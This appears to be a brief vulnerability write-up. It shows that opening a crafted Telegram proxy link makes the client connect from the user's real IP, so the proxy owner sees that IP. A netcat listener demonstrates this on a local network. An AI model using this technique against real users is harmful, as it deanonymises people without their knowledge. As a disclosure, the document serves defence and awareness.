# Telegram Exposes User IP | Proxy Leak
---

## How it Works ?

when user tries to connect to a proxy can do it by the following link:

**https://t.me/proxy?server=SERVER_IP&port=SERVER_PORT**

before connecting, telegram establish a tcp connection from the real user ip
to check server status
so, if we have the control to the server we can see real user ip

---

## Poc

lets test on a local proxy

```
nc -lnvp 7555
listening on [any] 7555 ...
```
---

- now my ip is ``192.168.1.20``

- proxy should be: ``https://t.me/proxy?server=192.168.1.20&port=7555``

now i'll open proxy from my phone

```
connect to [192.168.1.20] from (UNKNOWN) [192.168.1.196] 47750
```

```

```

## Desclaimer

I don't encourage you to any illegal activity,
**all for your saftey**
